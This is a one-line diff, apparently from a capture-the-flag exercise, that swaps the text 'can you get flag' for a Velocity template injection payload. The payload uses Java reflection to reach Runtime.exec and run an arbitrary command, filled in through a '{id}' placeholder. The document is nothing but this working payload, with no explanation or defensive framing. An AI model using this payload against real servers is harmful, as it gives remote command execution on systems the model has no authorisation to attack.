@@ -1,1 +1,1 @@
-can you get flag
+#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("{id}",null,null).toString();
